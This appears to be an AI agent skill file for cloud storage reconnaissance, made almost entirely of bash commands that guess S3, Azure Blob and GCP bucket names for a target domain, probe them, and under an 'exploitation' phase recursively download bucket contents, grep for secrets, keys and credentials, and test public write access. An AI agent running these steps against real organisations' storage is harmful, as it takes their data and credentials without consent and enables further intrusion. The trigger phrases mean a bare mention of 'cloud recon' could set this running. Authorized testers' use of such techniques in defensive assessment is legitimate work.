---
name: recon-cloud-assets
description: "Cloud asset discovery reconnaissance. S3 bucket enumeration, Azure Blob storage, GCP Cloud Storage, cloud subdomain identification, misconfigured storage exposure, cloud infrastructure mapping. Triggers: 'cloud assets', 's3 bucket', 'azure blob', 'gcp storage', 'cloud recon', 'cloud enumeration', 'cloud misconfiguration', 'storage bucket', 'cloud infrastructure discovery'."
---

# Cloud Asset Discovery

Identify cloud-hosted assets: S3 buckets, Azure Blob, GCP Storage, cloud subdomains.

## Install

```bash
# ProjectDiscovery tools:
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# AWS CLI:
pip install awscli --break-system-packages

# Azure CLI:
pip install azure-cli --break-system-packages

# GCloud:
# https://cloud.google.com/sdk/docs/install
```

---

## Phase 1: Cloud Subdomain Discovery

```bash
TARGET="target.com"
OUTPUT_DIR=".omop/engagement/recon/cloud"
mkdir -p "$OUTPUT_DIR"

# Find cloud-related subdomains:
subfinder -d "$TARGET" -silent | \
  grep -iE "s3\.|blob\.|storage\.|cdn\.|cloud\.|gcs\.|azure\|amazonaws\|cloudfront" | \
  tee "$OUTPUT_DIR/cloud_subdomains.txt"

# Common cloud provider patterns:
CLOUD_PATTERNS=(
  "*.amazonaws.com"
  "*.blob.core.windows.net"
  "*.storage.googleapis.com"
  "*.cloudfront.net"
  "*.azureedge.net"
  "*.s3.amazonaws.com"
)

# Check from subdomain list:
cat "$OUTPUT_DIR/cloud_subdomains.txt" | \
  grep -E "s3|blob|storage|gcs|cdn|cloudfront|azureedge"
```

---

## Phase 2: Generate Cloud Candidate URLs

```bash
TARGET="target.com"
OUTPUT_DIR=".omop/engagement/recon/cloud"

# Extract keywords from subdomains for bucket name guessing:
KEYWORDS=(
  "$TARGET"
  "${TARGET%.*}"       # domain without TLD
  "backup"
  "dev"
  "staging"
  "prod"
  "static"
  "media"
  "assets"
  "files"
  "data"
  "logs"
  "archive"
)

# Generate S3 bucket candidates:
for kw in "${KEYWORDS[@]}"; do
  echo "https://$kw.s3.amazonaws.com"
  echo "https://s3.amazonaws.com/$kw"
  echo "https://s3.us-east-1.amazonaws.com/$kw"
  echo "https://$kw-backup.s3.amazonaws.com"
  echo "https://$kw-assets.s3.amazonaws.com"
  echo "https://$kw-dev.s3.amazonaws.com"
done > "$OUTPUT_DIR/s3_candidates.txt"

# Azure Blob candidates:
for kw in "${KEYWORDS[@]}"; do
  echo "https://$kw.blob.core.windows.net"
  echo "https://${kw//.}storage.blob.core.windows.net"
done > "$OUTPUT_DIR/azure_candidates.txt"

# GCP Storage candidates:
for kw in "${KEYWORDS[@]}"; do
  echo "https://storage.googleapis.com/$kw"
  echo "https://$kw.storage.googleapis.com"
done > "$OUTPUT_DIR/gcs_candidates.txt"
```

---

## Phase 3: Verify Accessible Buckets

```bash
OUTPUT_DIR=".omop/engagement/recon/cloud"

# Check S3 buckets:
while IFS= read -r url; do
  code=$(curl -so /dev/null -w '%{http_code}' "$url" --max-time 10)
  case "$code" in
    200)
      echo "PUBLIC READ: $url"
      curl -s "$url" | head -50
      ;;
    403)
      echo "EXISTS (access denied): $url"
      ;;
    301|302)
      echo "REDIRECT: $url"
      ;;
  esac
done < "$OUTPUT_DIR/s3_candidates.txt" | tee "$OUTPUT_DIR/s3_results.txt"

# AWS CLI verification (even without creds, public buckets work):
while IFS= read -r url; do
  bucket=$(echo "$url" | sed 's|https://||;s|\.s3.*||;s|s3.amazonaws.com/||')
  if aws s3 ls "s3://$bucket" --no-sign-request 2>/dev/null; then
    echo "PUBLIC BUCKET: $bucket"
    aws s3 ls "s3://$bucket" --no-sign-request | head -20
  fi
done < "$OUTPUT_DIR/s3_candidates.txt"
```

---

## Phase 4: S3 Bucket Exploitation

```bash
BUCKET="target-bucket"

# List public bucket:
aws s3 ls "s3://$BUCKET" --no-sign-request
aws s3 ls "s3://$BUCKET" --no-sign-request --recursive | head -50

# Download interesting files:
aws s3 cp "s3://$BUCKET/config.json" . --no-sign-request
aws s3 cp "s3://$BUCKET/" ./bucket_contents/ --recursive --no-sign-request

# Check write access (bucket takeover):
echo "test" > /tmp/test.txt
aws s3 cp /tmp/test.txt "s3://$BUCKET/test.txt" --no-sign-request
# If success → bucket accepts public writes

# Check for sensitive files:
aws s3 ls "s3://$BUCKET" --no-sign-request --recursive | \
  grep -iE "\.env|config|secret|key|password|credential|backup|sql|db|pem|cert"
```

---

## Phase 5: Azure Blob Storage

```bash
ACCOUNT="targetaccount"
CONTAINERS=("images" "backup" "data" "uploads" "media" "static")

# Test public container access:
for container in "${CONTAINERS[@]}"; do
  url="https://$ACCOUNT.blob.core.windows.net/$container?restype=container&comp=list"
  code=$(curl -so /dev/null -w '%{http_code}' "$url")
  if [ "$code" = "200" ]; then
    echo "PUBLIC CONTAINER: $container"
    curl -s "$url" | grep -oE "<Name>[^<]+</Name>" | head -20
  fi
done

# List blobs in public container:
curl -s "https://$ACCOUNT.blob.core.windows.net/$CONTAINER?restype=container&comp=list" \
  | python3 -c "import sys,re; [print(x) for x in re.findall(r'<Name>([^<]+)</Name>', sys.stdin.read())]"

# Download blob:
curl -s "https://$ACCOUNT.blob.core.windows.net/$CONTAINER/sensitive-file.txt" -o sensitive.txt
```

---

## Phase 6: Certificate Transparency for Cloud Assets

```bash
TARGET="target.com"

# crt.sh via API:
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | \
  python3 -c "
import json, sys
data = json.load(sys.stdin)
for entry in data:
    names = entry.get('name_value', '')
    for name in names.split('\n'):
        if any(x in name for x in ['s3', 'blob', 'storage', 'cdn', 'cloud']):
            print(name.strip())
" | sort -u | tee ".omop/engagement/recon/cloud/ct_cloud_assets.txt"
```

---

## Phase 7: nuclei Cloud Misconfig Scan

```bash
TARGET="https://TARGET"

nuclei -t http/misconfiguration/aws/ \
       -t http/misconfiguration/azure/ \
       -t http/exposures/ \
       -u "$TARGET" \
       -o ".omop/engagement/recon/cloud/nuclei-results.txt"

# Also:
nuclei -t network/detection/ -u "$TARGET"
```

---

## Output

Save to `.omop/engagement/recon/cloud/`:
- `cloud_subdomains.txt` — cloud-related subdomains
- `s3_results.txt` — accessible S3 buckets
- `azure_results.txt` — accessible Azure containers
- `bucket_contents/` — downloaded bucket files
- `nuclei-results.txt` — automated findings

## Next Phase

→ `recon-subdomain` for full subdomain enumeration
→ `tech-github-secrets` for secrets in code repositories
